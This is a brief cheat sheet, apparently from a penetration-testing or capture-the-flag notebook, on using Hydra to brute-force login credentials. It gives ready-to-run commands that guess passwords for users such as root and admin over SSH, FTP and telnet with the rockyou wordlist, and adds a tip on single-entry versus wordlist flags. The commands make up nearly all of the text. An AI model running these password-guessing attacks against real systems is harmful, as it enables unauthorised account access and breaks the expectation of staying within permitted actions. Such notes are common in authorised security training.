used to brute force login credentials on services like **ssh**, **ftp**, **http**, etc.

basic syntax:
```bash
hydra -l <username> -P <wordlist> <service>://<IP> 

```
## SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

## ftp
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
```

## telnet
```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt telnet://<IP>
```
🚨**remember**
use capital letter to enter a wordlist and a lower letter for a single entry
example:
```-l``` for a single username
```-L``` for a wordlist